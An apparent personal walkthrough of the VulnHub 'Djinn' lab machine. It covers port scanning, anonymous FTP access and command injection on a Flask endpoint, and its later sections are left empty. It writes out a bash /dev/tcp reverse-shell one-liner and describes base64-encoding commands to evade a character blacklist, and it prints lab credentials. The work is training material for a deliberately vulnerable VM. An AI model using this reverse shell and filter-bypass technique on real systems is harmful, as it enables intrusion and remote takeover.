---
layout: default
---
<html>
<head>
    <title>Djinn Walkthrough</title>
    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
</head>

<body>

    <h1>Djinn Walkthrough</h1>

    <hr>

    <h2>Summary</h2>

    <p></p>

    <h2>Port Scanning</h2>

    <li>Running a port scan against the full port range to determine which ones are open.</li>

    <pre>
# Nmap 7.91 scan initiated Fri Sep 24 15:36:37 2021 as: nmap -p- -oN ping_tcp 10.0.0.20&#13;&#10;Nmap scan report for 10.0.0.20&#13;&#10;Host is up (0.0012s latency).&#13;&#10;Not shown: 65531 closed ports&#13;&#10;PORT     STATE    SERVICE&#13;&#10;21/tcp   open     ftp&#13;&#10;22/tcp   filtered ssh&#13;&#10;1337/tcp open     waste&#13;&#10;7331/tcp open     swx&#13;&#10;MAC Address: 00:0C:29:2C:20:02 (VMware)&#13;&#10;&#13;&#10;# Nmap done at Fri Sep 24 15:36:45 2021 -- 1 IP address (1 host up) scanned in 8.00 seconds
    </pre>

    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>

    <pre>
# Nmap 7.91 scan initiated Fri Sep 24 15:37:12 2021 as: nmap -p21,1337,7331 -sV -sC -oN script_tcp 10.0.0.20&#13;&#10;Nmap scan report for 10.0.0.20&#13;&#10;Host is up (0.00019s latency).&#13;&#10;&#13;&#10;PORT     STATE SERVICE VERSION&#13;&#10;21/tcp   open  ftp     vsftpd 3.0.3&#13;&#10;| ftp-anon: Anonymous FTP login allowed (FTP code 230)&#13;&#10;| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt&#13;&#10;| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt&#13;&#10;|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt&#13;&#10;| ftp-syst: &#13;&#10;|   STAT: &#13;&#10;| FTP server status:&#13;&#10;|      Connected to ::ffff:10.0.0.1&#13;&#10;|      Logged in as ftp&#13;&#10;|      TYPE: ASCII&#13;&#10;|      No session bandwidth limit&#13;&#10;|      Session timeout in seconds is 300&#13;&#10;|      Control connection is plain text&#13;&#10;|      Data connections will be plain text&#13;&#10;|      At session startup, client count was 4&#13;&#10;|      vsFTPd 3.0.3 - secure, fast, stable&#13;&#10;|_End of status&#13;&#10;1337/tcp open  waste?&#13;&#10;| fingerprint-strings: &#13;&#10;|   NULL: &#13;&#10;|     ____ _____ _ &#13;&#10;|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ &#13;&#10;|     \x20/ _ \x20 | | | | &apos;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/&#13;&#10;|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|&#13;&#10;|     Let&apos;s see how good you are with simple maths&#13;&#10;|     Answer my questions 1000 times and I&apos;ll give you your gift.&#13;&#10;|     &apos;/&apos;, 4)&#13;&#10;|   RPCCheck: &#13;&#10;|     ____ _____ _ &#13;&#10;|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ &#13;&#10;|     \x20/ _ \x20 | | | | &apos;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/&#13;&#10;|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|&#13;&#10;|     Let&apos;s see how good you are with simple maths&#13;&#10;|     Answer my questions 1000 times and I&apos;ll give you your gift.&#13;&#10;|_    &apos;*&apos;, 2)&#13;&#10;7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)&#13;&#10;|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+&#13;&#10;|_http-title: Lost in space&#13;&#10;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&#13;&#10;SF-Port1337-TCP:V=7.91%I=7%D=9/24%Time=614E28F5%P=x86_64-pc-linux-gnu%r(NU&#13;&#10;SF:LL,1BC,&quot;\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20&#13;&#10;SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\&#13;&#10;SF:x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20&#13;&#10;SF:__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20&apos;_\&#13;&#10;SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20&apos;_\x&#13;&#10;SF:20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\&#13;&#10;SF:x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\&#13;&#10;SF:|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\&#13;&#10;SF:x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n&#13;&#10;SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\&#13;&#10;SF:n\nLet&apos;s\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths&#13;&#10;SF:\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I&apos;ll\x20give\x20&#13;&#10;SF:you\x20your\x20gift\.\n\(9,\x20&apos;/&apos;,\x204\)\n&gt;\x20&quot;)%r(RPCCheck,1BC,&quot;\x2&#13;&#10;SF:0\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x&#13;&#10;SF:20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x&#13;&#10;SF:20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20&apos;_\x20`\x20_\x&#13;&#10;SF:20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20&apos;_\x20`\x20_\x2&#13;&#10;SF:0\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|&#13;&#10;SF:\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20&#13;&#10;SF:\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\_&#13;&#10;SF:__\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\&#13;&#10;SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet&apos;s\x2&#13;&#10;SF:0see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x2&#13;&#10;SF:0my\x20questions\x201000\x20times\x20and\x20I&apos;ll\x20give\x20you\x20your&#13;&#10;SF:\x20gift\.\n\(9,\x20&apos;\*&apos;,\x202\)\n&gt;\x20&quot;);&#13;&#10;MAC Address: 00:0C:29:2C:20:02 (VMware)&#13;&#10;Service Info: OS: Unix&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Sep 24 15:38:47 2021 -- 1 IP address (1 host up) scanned in 95.17 seconds
    </pre>

    <br>
    <h2>Information Gathering</h2>

    <li>I begin with logging into the FTP server.  The creds anonymous:anonymous let me in.</li>

    <pre>
&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ ftp 10.0.0.20  &#13;&#10;Connected to 10.0.0.20.&#13;&#10;220 (vsFTPd 3.0.3)&#13;&#10;Name (10.0.0.20:kali): anonymous&#13;&#10;530 Please login with USER and PASS.&#13;&#10;530 Please login with USER and PASS.&#13;&#10;SSL not available&#13;&#10;331 Please specify the password.&#13;&#10;Password:&#13;&#10;230 Login successful.&#13;&#10;Remote system type is UNIX.&#13;&#10;Using binary mode to transfer files.&#13;&#10;ftp&gt; ls&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Here comes the directory listing.&#13;&#10;-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt&#13;&#10;-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt&#13;&#10;-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt&#13;&#10;226 Directory send OK.&#13;&#10;ftp&gt; mget *&#13;&#10;mget creds.txt? y&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Opening BINARY mode data connection for creds.txt (11 bytes).&#13;&#10;226 Transfer complete.&#13;&#10;11 bytes received in 0.00 secs (195.3125 kB/s)&#13;&#10;mget game.txt? y&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Opening BINARY mode data connection for game.txt (128 bytes).&#13;&#10;226 Transfer complete.&#13;&#10;128 bytes received in 0.00 secs (2.7127 MB/s)&#13;&#10;mget message.txt? y&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Opening BINARY mode data connection for message.txt (113 bytes).&#13;&#10;226 Transfer complete.&#13;&#10;113 bytes received in 0.00 secs (2.4492 MB/s)&#13;&#10;ftp&gt; exit&#13;&#10;221 Goodbye.
    </pre>

    <li>According to the files there is a game of some sort for us to play on port 1337.  There are also credentials in creds.txt that I am going to take note of, nitu:81299</li>

    <pre>
&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ cat creds.txt                                                                                                1 &Cross;&#13;&#10;nitu:81299&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ cat game.txt &#13;&#10;oh and I forgot to tell you I&apos;ve setup a game for you on port 1337. See if you can reach to the &#13;&#10;final level and get the prize.&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ cat message.txt &#13;&#10;@nitish81299 I am going on holidays for few days, please take care of all the work. &#13;&#10;And don&apos;t mess up anything.
    </pre>

    <li>Next I run gobuster against the web server on port 7331.</li>

    <pre>
&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ gobuster dir -u http://10.0.0.20:7331/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt                     &#13;&#10;===============================================================&#13;&#10;Gobuster v3.1.0&#13;&#10;by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)&#13;&#10;===============================================================&#13;&#10;[+] Url:                     http://10.0.0.20:7331/&#13;&#10;[+] Method:                  GET&#13;&#10;[+] Threads:                 10&#13;&#10;[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt&#13;&#10;[+] Negative Status codes:   404&#13;&#10;[+] User Agent:              gobuster/3.1.0&#13;&#10;[+] Timeout:                 10s&#13;&#10;===============================================================&#13;&#10;2021/09/24 20:17:29 Starting gobuster in directory enumeration mode&#13;&#10;===============================================================&#13;&#10;/wish                 (Status: 200) [Size: 385]&#13;&#10;/genie                (Status: 200) [Size: 1676]&#13;&#10;                                                &#13;&#10;===============================================================&#13;&#10;2021/09/24 20:18:01 Finished&#13;&#10;===============================================================
    </pre>

    <li>This reveals two directories.  The /wish directory leads us to a reverse shell.  On this page we are able to submit commands.  When we submit "whoami" we see www-data returns in the URL that we get redirected to.  So it appears we are getting command execution.  I did this in Burp as shown below.</li>

    <img src="../images/djinn/injection_spot.png">

    <li>However, when we submit other commands such as a reverse shell, "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", it returns with "Wrong+choice+of+words".  It looks like user input is being filtered so I use base64 encoding to get around this.  First I encoded the command with base64 and then I piped the base64 encoded command into bash to be executed.</li>
    <ul>
        <li>Here I demonstrate/test</li>
        <img src="../images/djinn/base64_test.png">
    </ul>

    <br>
    <h2>Foothold</h2>

    <li>Getting shell on Djinn using the base64 encoded command</li>

    <img src="../images/djinn/rev_shell.png">

    <li>After getting shell I take a look at the file app.py</li>
    
    <pre>
        www-data@djinn:/opt$ cat 80/app.py&#13;&#10;        import subprocess&#13;&#10;        &#13;&#10;        from flask import Flask, redirect, render_template, request, url_for&#13;&#10;        &#13;&#10;        app = Flask(__name__)&#13;&#10;        app.secret_key = &quot;key&quot;&#13;&#10;        
        <mark>CREDS = &quot;/home/nitish/.dev/creds.txt&quot;</mark>&#13;&#10;        &#13;&#10;        RCE = [&quot;/&quot;, &quot;.&quot;, &quot;?&quot;, &quot;*&quot;, &quot;^&quot;, &quot;$&quot;, &quot;eval&quot;, &quot;;&quot;]&#13;&#10;        &#13;&#10;        &#13;&#10;        def validate(cmd):&#13;&#10;            if CREDS in cmd and &quot;cat&quot; not in cmd:&#13;&#10;                return True&#13;&#10;        &#13;&#10;            try:&#13;&#10;                for i in RCE:&#13;&#10;                    for j in cmd:&#13;&#10;                        if i == j:&#13;&#10;                            return False&#13;&#10;                return True&#13;&#10;            except Exception:&#13;&#10;                return False&#13;&#10;        &#13;&#10;        &#13;&#10;        @app.route(&quot;/&quot;, methods=[&quot;GET&quot;])&#13;&#10;        def index():&#13;&#10;            return render_template(&quot;main.html&quot;)&#13;&#10;        &#13;&#10;        &#13;&#10;        @app.route(&quot;/wish&quot;, methods=[&apos;POST&apos;, &quot;GET&quot;])&#13;&#10;        def wish():&#13;&#10;            execute = request.form.get(&quot;cmd&quot;)&#13;&#10;            if execute:&#13;&#10;                if validate(execute):&#13;&#10;                    output = subprocess.Popen(execute, shell=True,&#13;&#10;                                              stdout=subprocess.PIPE).stdout.read()&#13;&#10;                else:&#13;&#10;                    output = &quot;Wrong choice of words&quot;&#13;&#10;        &#13;&#10;                return redirect(url_for(&quot;genie&quot;, name=output))&#13;&#10;            else:&#13;&#10;                return render_template(&apos;wish.html&apos;)&#13;&#10;        &#13;&#10;        &#13;&#10;        @app.route(&apos;/genie&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])&#13;&#10;        def genie():&#13;&#10;            if &apos;name&apos; in request.args:&#13;&#10;                page = request.args.get(&apos;name&apos;)&#13;&#10;            else:&#13;&#10;                page = &quot;It&apos;s not that hard&quot;&#13;&#10;        &#13;&#10;            return render_template(&apos;genie.html&apos;, file=page)&#13;&#10;        &#13;&#10;        &#13;&#10;        if __name__ == &quot;__main__&quot;:&#13;&#10;            app.run(host=&apos;0.0.0.0&apos;, debug=True)        
    </pre>

    <li>I highlighed the above code where the code specifies a file in the home directory of nitish named "creds.txt".  I take a look at this file and find credentials for the user nitish.</li>

    <pre>
www-data@djinn:/opt$ cat /home/nitish/.dev/creds.txt&#13;&#10;nitish:p4ssw0rdStr3r0n9
    </pre>

    <br>
    <h2>Privesc - nitish</h2>

    <li>I use the "su" command to switch to this user.</li>

    <pre>
www-data@djinn:/opt$ su nitish &#13;&#10;Password: &#13;&#10;nitish@djinn:/opt$ 
    </pre>


    
    <br>
    <h2>Privesc - sam</h2>


    <br>
    <h2>Privesc - Root</h2>

</body>
</html>

